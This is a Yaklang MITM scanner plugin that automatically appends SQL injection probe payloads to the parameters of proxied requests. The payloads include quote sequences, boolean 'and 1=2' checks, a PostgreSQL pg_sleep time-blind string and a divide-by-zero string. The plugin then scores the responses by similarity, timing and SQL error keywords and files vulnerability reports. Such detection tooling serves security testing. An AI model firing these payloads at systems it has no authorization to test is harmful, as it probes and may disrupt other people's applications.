/** 
// 关于检测组 detectionGroups编写方式
// 1. 需要现在payloads中罗列会用到的payload,如果payload中有"引号，需要在"前加入转义符，如\"
// 2. original的含义是原响应包
//             {
//                 "payload": "'",
//                 "compareWith": "original",
//                 "threshold": 0.989,
//                 "thresholdOperator": "<",
//                 "timeThreshold": 5000,
//                 "timeThresholdOperator": "<"
//             }
//             参数后拼接'，与原响应包的相似度小于0.989响应时间小于5000毫秒(5秒)
//             {
//                 "payload": "'''",
//                 "compareWith": "'",
//                 "threshold": 0.99,
//                 "thresholdOperator": ">",
//                 "timeThreshold": 5000,
//                 "timeThresholdOperator": "<"
//             }
//             参数拼接后'''与'的响应包相似度大于0.99响应时间小于5000毫秒(5秒)
//             不同{}{}的检测关系为同时满足
//3. 在调试时建议先注释46-67行，46-67行代码段为去重代码
//4. 如要增加报错检测关键字，自行扩展第385行sensitiveKeywords
*/

// 通过 CLI 接收域名黑名单，逗号分隔，支持主域及子域匹配
blacklistDomainsStr = cli.String("blacklist",cli.setDefault("baidu.com,google.com,googleapis.com"),cli.setHelp("设置域名黑名单，逗号分隔；会匹配主域及其子域，例如 example.com 匹配 a.example.com"),cli.setVerboseName("域名黑名单"),cli.setRequired(false))
cli.check()
// 将逗号分隔的域名列表解析为字典，便于 O(1) 查询
parseDomainListToMap = func(listStr /* string */) {
    m = {}
    if listStr == nil || listStr == "" {
        return m
    }
    for _, item := range str.Split(listStr, ",") {
        d = str.TrimSpace(item)
        if d == "" {
            continue
        }
        d = str.ToLower(d)
        // 去掉可能的首尾点（单次修剪，避免不支持 while 语法）
        if str.HasPrefix(d, ".") {
            d = d[1:]
        }
        if str.HasSuffix(d, ".") {
            d = d[:len(d)-1]
        }
        if d != "" {
            m[d] = true
        }
    }
    return m
}

domainBlacklistMap = parseDomainListToMap(blacklistDomainsStr)

mirrorFilteredHTTPFlow = func(isHttps /* bool */, url /* string */, req /* []byte */, rsp /* []byte */, body /* []byte */) {
    println("hello world3")
    rspIns23 = poc.ParseBytesToHTTPResponse(rsp)~
    codes = [404, 502, 301, 302]
    if rspIns23.StatusCode in codes {
        println("状态码判定跳过")
        return
    }


    freq, err = fuzz.HTTPRequest(req, fuzz.https(isHttps))
    die(err)
    host, port, _ = str.ParseStringToHostPort(url)
    addr = str.HostPort(host, port)

    // url 域名黑名单（来自 CLI），排除主域及其子域名
    hostLower = str.ToLower(host)
    for domain, _ := range domainBlacklistMap {
        if hostLower == domain || str.HasSuffix(hostLower, "." + domain) {
            println("黑名单命中域名，跳过: " + host)
            return
        }
    }

    getpa = freq.GetCommonParams()
    getpa = string(getpa)
    paths222 = ""

    //去重机制（统一逻辑）
    reqPath = poc.GetHTTPRequestPath(req)
    paths222 = reqPath + addr + getpa
    println(paths222)
    paths222 = codec.Md5(paths222)


    if db.GetProjectKey(paths222) == "123" {
        println("重复扫描，已跳过")
        return
    } else {
        db.SetProjectKey(paths222, "123")
    }



// === 从这里开始并发处理 ===

// 发送原始请求获取基准响应
    originalResp, _, _ = poc.HTTPEx(
        req, 
        poc.https(isHttps), 
    )
    originalBody = originalResp.GetBody()

    // 获取所有参数进行测试
    params = freq.GetCommonParams()

    // 定义检测组
       detectionGroups = [
    {
        "name": "单引号SQL注入检测",
        "payloads": [
            "'",
            "''",
            "'''"
        ],
        "conditions": [
            {
                "payload": "'",
                "compareWith": "original",
                "threshold": 0.989,
                "thresholdOperator": "<",
                "timeThreshold": 5000,
                "timeThresholdOperator": "<"
            },
            {
                "payload": "''",
                "compareWith": "original",
                "threshold": 0.9,
                "thresholdOperator": ">",
                "timeThreshold": 5000,
                "timeThresholdOperator": "<"
            },
            {
                "payload": "'''",
                "compareWith": "'",
                "threshold": 0.99,
                "thresholdOperator": ">",
                "timeThreshold": 5000,
                "timeThresholdOperator": "<"
            },
            {
                "payload": "'''",
                "compareWith": "''",
                "threshold": 0.992,
                "thresholdOperator": "<",
                "timeThreshold": 5000,
                "timeThresholdOperator": "<"
            }
        ],
        "description": "通过单引号、双引号和三引号的响应相似度分析检测SQL注入"
    },
    {
        "name": "无符号SQL注入检测",
        "payloads": [
            "'",
            "''",
            "'''",
            "''''",
            " and 1=1",
            " and 1=2"
        ],
        "conditions": [
            {
                "payload": "'",
                "compareWith": "original",
                "threshold": 0.998,
                "thresholdOperator": "<",
                "timeThreshold": 5000,
                "timeThresholdOperator": "<"
            },
            {
                "payload": "''",
                "compareWith": "'",
                "threshold": 0.99,
                "thresholdOperator": ">",
                "timeThreshold": 5000,
                "timeThresholdOperator": "<"
            },
            {
                "payload": "'''",
                "compareWith": "'",
                "threshold": 0.99,
                "thresholdOperator": ">",
                "timeThreshold": 5000,
                "timeThresholdOperator": "<"
            },
            {
                "payload": "''''",
                "compareWith": "'",
                "threshold": 0.99,
                "thresholdOperator": ">",
                "timeThreshold": 5000,
                "timeThresholdOperator": "<"
            },
            {
                "payload": " and 1=1",
                "compareWith": "original",
                "threshold": 0.989,
                "thresholdOperator": ">",
                "timeThreshold": 5000,
                "timeThresholdOperator": "<"
            },
            {
                "payload": " and 1=2",
                "compareWith": "original",
                "threshold": 0.997,
                "thresholdOperator": "<",
                "timeThreshold": 5000,
                "timeThresholdOperator": "<"
            }
        ],
        "description": "通过单引号、双引号和三引号的响应相似度分析检测SQL注入"
    },{
        "name": "报错检测",
        "payloads": [
            "\"",
            "鎈'\"\\("
        ],
        "conditions": [
            {
                "payload": "\"",
                "compareWith": "original",
                "threshold": 0.01,
                "thresholdOperator": "<",
                "timeThreshold": 5000,
                "timeThresholdOperator": "<"
            },
{
                "payload": "鎈'\"\\(",
                "compareWith": "original",
                "threshold": 0.989,
                "thresholdOperator": "<",
                "timeThreshold": 5000,
                "timeThresholdOperator": "<"
            }
        ],
        "description": "拼接容易出现报错的字符从而导致报错"
    },{
        "name": "PostgreSQL时间盲注",
        "payloads": [
            "'/**/and(select'1'from/**/pg_sleep(2))::text>'0",
            "'/**/and(select'1'from/**/pg_sleep(4))::text>'0"
        ],
        "conditions": [
            {
                "payload": "'/**/and(select'1'from/**/pg_sleep(2))::text>'0",
                "compareWith": "original",
                "threshold": 0.1,
                "thresholdOperator": ">",
                "timeThreshold": 5000,
                "timeThresholdOperator": "<"
            },
            {
                "payload": "'/**/and(select'1'from/**/pg_sleep(4))::text>'0",
                "compareWith": "original",
                "threshold": 0.1,
                "thresholdOperator": ">",
                "timeThreshold": 4000,
                "timeThresholdOperator": ">"
            }
        ],
        "description": "PostgreSQL时间盲注"
    },{
        "name": "sql除零异常",
        "payloads": [
            "'||1/0||'",
            "'||1/1||'"
        ],
        "conditions": [
            {
                "payload": "'||1/0||'",
                "compareWith": "original",
                "threshold": 0.989,
                "thresholdOperator": "<",
                "timeThreshold": 5000,
                "timeThresholdOperator": "<"
            },
            {
                "payload": "'||1/1||'",
                "compareWith": "original",
                "threshold": 0.989,
                "thresholdOperator": ">",
                "timeThreshold": 5000,
                "timeThresholdOperator": "<"
            }
        ],
        "description": "通过数学运算错误检测SQL注入，包括Oracle和其他数据库的除零错误"
    }
]

    // 在执行检测前添加验证
    for groupIndex, group := range detectionGroups {
        for _, condition := range group["conditions"] {
            payloadFound = false
            for _, payload := range group["payloads"] {
                if payload == condition["payload"] {
                    payloadFound = true
                    break
                }
            }


            if !payloadFound {
                println("警告: 检测组 " + group["name"] + " 中condition的payload未在payloads中定义")
                continue
            }
        }
    }



// === 并发处理参数测试 ===

// 创建并发控制
    maxConcurrent = 5// 最大并发数，可根据需要调整        
    wg = sync.NewSizedWaitGroup(maxConcurrent)

    // 对每个参数进行并发测试
    for paramIndex, currentParam := range params {
        wg.Add()

        // 启动并发 goroutine
        go func(param) {
            defer wg.Done()

            paramName = param.Name()
            originalValue = param.Value()
            println("正在测试参数: " + paramName + ", 原始值: " + originalValue)

            // 确定参数类型
            paramType = ""
            if param.IsGetParams() {
                paramType = "GET"
            } else if param.IsPostParams() {
                paramType = "POST"
            } else if param.IsCookieParams() {
                paramType = "COOKIE"
            } else {
                paramType = "OTHER"
            }



// 对每个检测组进行测试
            for groupIndex, group := range detectionGroups {
                println("参数 [%s] 执行检测组: %s" % [paramName, group["name"]])

                // 存储所有载荷的响应体、相似度和响应时间
                responses = {}
                similarities = {}
                responseTimes = {}

                // 常量：敏感关键字（移至载荷循环外避免重复分配）
                sensitiveKeywords := []string{"Microsoft OLE DB Provider for ODBC Drivers error", "Microsoft SQL Native Client error", "You have an error in your SQL syntax", "MySQL Error: 1064", "mysql error with query", "SQL syntax error", "Warning: mysql_fetch_array", "Warning: mysql_num_rows", "Warning: mysql_query", "Warning: mysql_fetch_assoc", "Warning: mysql_result", "ORA-00933: SQL command not properly ended", "ORA-", "Query failed: ERROR: syntax error at or near", "PostgreSQL query failed: ERROR: parser: parse error", "syntax error at or near", "parser: parse error", "SQL command not properly ended"}

                // 测试每个载荷
                for _, payload := range group["payloads"] {
                    testReqs = []

                    // 构造完整的载荷（保留原始值）
                    fullPayload = originalValue + payload
                    println("参数 [%s] 测试载荷: %s" % [paramName, fullPayload])

                    // 统一构造模糊测试请求
                    testReqs, _ = param.Fuzz(fullPayload).Results()



// 发送测试请求并收集响应
                    for _, testRequest := range testReqs {
                        startTime = time.Now()
                        testResp, _, err = poc.HTTPEx(testRequest, poc.https(isHttps))// 捕获错误                                                
                        responseTime = time.Since(startTime).Milliseconds()
                        testBody = testResp.GetBody()
                        if err != nil {
                            println("请求错误: %v" % [err])
                        }



// 存储响应体和响应时间
                        responses[payload] = testBody
                        responseTimes[payload] = responseTime

                        // 计算与原始响应的相似度
                        similarity, err = str.CalcSimHashStability(originalBody, testBody)
                        if err != nil {
                            continue
                        }


                        similarities[payload] = similarity
                        println("参数 [%s] 载荷: %s, 相似度: %f, 响应时间: %d ms" % [paramName, payload, similarity, responseTime])

                        // 检查响应体中是否包含敏感关键字（大小写不敏感）
                        var hasReportedMediumRisk = false
                        // 转换响应体为小写进行大小写不敏感检测
                        lowerTestBody := str.ToLower(testBody)
                        // 遍历敏感关键字
                        for _, keyword := range sensitiveKeywords {
                            if str.Contains(lowerTestBody, str.ToLower(keyword)) {
                                if !hasReportedMediumRisk {
                                    keywordPos := str.Index(lowerTestBody, str.ToLower(keyword))
                                    // 计算上下文范围
                                    startPos := keywordPos - 40
                                    if startPos < 0 {
                                        startPos = 0
                                    }


                                    endPos := keywordPos + len(keyword) + 40
                                    if endPos > len(testBody) {
                                        endPos = len(testBody)
                                    }


// 提取上下文
                                    context := testBody[startPos:endPos]

                                    // 创建中危漏洞报告
                                    risk.NewRisk(
                                        host, 
                                        risk.title("敏感信息泄露: 检测到SQL关键字 '" + keyword + "'"), 
                                        risk.severity("info"), 
                                        risk.parameter(paramName), 
                                        risk.payload(payload), 
                                        risk.description("响应中包含敏感SQL关键字，可能导致信息泄露"), 
                                        risk.solution("对用户输入进行严格过滤和转义，避免在响应中返回敏感信息"), 
                                        risk.typeVerbose("sensitive-info-leakage"), 
                                        risk.details({"keyword": keyword, "context": context}), 
                                    )

                                    // 标记已报告
                                    hasReportedMediumRisk = true
                                }
                            }
                        }


                        break// 每个载荷只测试第一个请求// 每个载荷只测试第一个请求// 每个载荷只测试第一个请求// 每个载荷只测试第一个请求
                    }
                }



// 计算载荷之间的相似度
                for _, condition := range group["conditions"] {
                    if condition["compareWith"] != "original" {
                        comparePayload = condition["compareWith"]
                        targetPayload = condition["payload"]

                        if responses[comparePayload] != "" && responses[targetPayload] != "" {
                            similarity, err = str.CalcSimHashStability(responses[comparePayload], responses[targetPayload])
                            if err == nil {
                                similarities[targetPayload + "_vs_" + comparePayload] = similarity
                                println("参数 [%s] %s 与 %s 相似度: %f" % [paramName, targetPayload, comparePayload, similarity])
                            }
                        }
                    }
                }



// 检查是否满足所有条件
                isVulnerable = true
                conditionResults = {}

                println("=== 参数 [%s] 开始条件判断 ===" % [paramName])
                println("调试信息 - 所有载荷的相似度:")
                for key, value := range similarities {
                    println("  %s: %f" % [key, value])
                }


                println("调试信息 - 所有载荷的响应时间:")
                for key, value := range responseTimes {
                    println("  %s: %d ms" % [key, int(value)])
                }


                for conditionIndex, condition := range group["conditions"] {
                    payload = condition["payload"]
                    compareWith = condition["compareWith"]
                    threshold = condition["threshold"]
                    thresholdOperator = condition["thresholdOperator"]
                    timeThreshold = condition["timeThreshold"]
                    timeThresholdOperator = condition["timeThresholdOperator"]

                    println("参数 [%s] 条件 %d: 载荷=%s, 比较对象=%s" % [paramName, conditionIndex + 1, payload, compareWith])

                    // 确定要比较的相似度
                    similarityKey = payload
                    if compareWith != "original" {
                        similarityKey = payload + "_vs_" + compareWith
                    }


                    similarity = similarities[similarityKey]
                    responseTime = responseTimes[payload]

                    // 修复格式化问题：确保responseTime是整数类型
                    responseTimeInt = int(responseTime)
                    println("  实际相似度: %f, 实际响应时间: %d ms" % [similarity, responseTimeInt])

                    // 检查相似度条件
                    similarityMet = false
                    if thresholdOperator == "<" {
                        similarityMet = similarity < threshold
                        println("  相似度条件: %f %s %f = %v" % [similarity, thresholdOperator, threshold, similarityMet])
                    } else if thresholdOperator == ">" {
                        similarityMet = similarity > threshold
                        println("  相似度条件: %f %s %f = %v" % [similarity, thresholdOperator, threshold, similarityMet])
                    } else if thresholdOperator == "=" {
                        similarityMet = similarity == threshold
                        println("  相似度条件: %f %s %f = %v" % [similarity, thresholdOperator, threshold, similarityMet])
                    }



// 检查时间条件
                    timeMet = false
                    if timeThresholdOperator == "<" {
                        timeMet = responseTimeInt < timeThreshold
                        println("  时间条件: %d %s %d = %v" % [responseTimeInt, timeThresholdOperator, timeThreshold, timeMet])
                    } else if timeThresholdOperator == ">" {
                        timeMet = responseTimeInt > timeThreshold
                        println("  时间条件: %d %s %d = %v" % [responseTimeInt, timeThresholdOperator, timeThreshold, timeMet])
                    } else if timeThresholdOperator == "=" {
                        timeMet = responseTimeInt == timeThreshold
                        println("  时间条件: %d %s %d = %v" % [responseTimeInt, timeThresholdOperator, timeThreshold, timeMet])
                    }



// 记录条件检查结果
                    conditionResults[payload + "_similarity"] = similarityMet
                    conditionResults[payload + "_time"] = timeMet

                    // 条件组合结果
                    conditionPassed = similarityMet && timeMet
                    println("  条件 %d 综合结果: %v (相似度: %v AND 时间: %v)" % [conditionIndex + 1, conditionPassed, similarityMet, timeMet])

                    // 两个条件都满足才算通过
                    if !conditionPassed {
                        isVulnerable = false
                        println("  ❌ 条件 %d 未通过，检测失败" % [conditionIndex + 1])
                    } else {
                        println("  ✅ 条件 %d 通过" % [conditionIndex + 1])
                    }
                }


                println("=== 参数 [%s] 条件判断结束 ===" % [paramName])
                println("参数 [%s] 检测组 %s 最终结果: %v" % [paramName, group["name"], isVulnerable])

                if isVulnerable {
                    println("🎯 参数 [%s] 所有条件均满足，检测到SQL注入漏洞!" % [paramName])
                } else {
                    println("❌ 参数 [%s] 存在条件未满足，未检测到漏洞" % [paramName])
                }



// 如果发现漏洞，创建报告
                if isVulnerable {
                    println("检测到SQL注入漏洞! 参数: %s, 检测组: %s" % [paramName, group["name"]])

                    // 使用第一个载荷的请求进行报告
                    firstPayload = group["payloads"][0]
                    fullPayload = originalValue + firstPayload
                    testReqs = []

                    if param.IsGetParams() {
                        testReqs, _ = param.Fuzz(fullPayload).Results()
                    } else if param.IsPostParams() {
                        testReqs, _ = param.Fuzz(fullPayload).Results()
                    } else if param.IsCookieParams() {
                        testReqs, _ = param.Fuzz(fullPayload).Results()
                    } else {
                        testReqs, _ = param.Fuzz(fullPayload).Results()
                    }


                    if len(testReqs) > 0 {
                        testResp, _, _ = poc.HTTPEx(testReqs[0], poc.https(isHttps))

                        // 解析请求和响应对象
                        reqIns, err1 = poc.ParseBytesToHTTPRequest(testResp.RawRequest)
                        if err1 != nil {
                            continue
                        }


                        rspIns, err2 = poc.ParseBytesToHTTPResponse(testResp.RawPacket)
                        if err2 != nil {
                            continue
                        }



// 创建风险报告
                        risk.NewRisk(
                            reqIns.URL.Host, 
                            risk.title("SQL注入 (%s): %v" % [group["name"], reqIns.URL.String()]), 
                            risk.severity("critical"), 
                            risk.parameter(paramName), 
                            risk.payload(fullPayload), 
                            risk.description(group["description"]), 
                            risk.solution("使用参数化查询或预编译语句，对用户输入进行严格过滤和转义"), 
                            risk.typeVerbose("sql-injection"), 
                            risk.request(testResp.RawRequest), 
                            risk.type("sql-injection"), 
                            risk.response(testResp.RawPacket), 
                            risk.details({"detection_group": group["name"], "original_value": originalValue, "similarities": similarities, "response_times": responseTimes, "condition_results": conditionResults, "param_type": paramType, "param_position": param.PositionVerbose(), "detection_method": "multi_payload_similarity_analysis"}), 
                        )

                        // 找到一个漏洞后停止当前参数的测试
                        break
                    }
                }
            }
        }(currentParam)
    }



// 等待所有并发任务完成
    wg.Wait()
    println("所有参数测试完成")
}

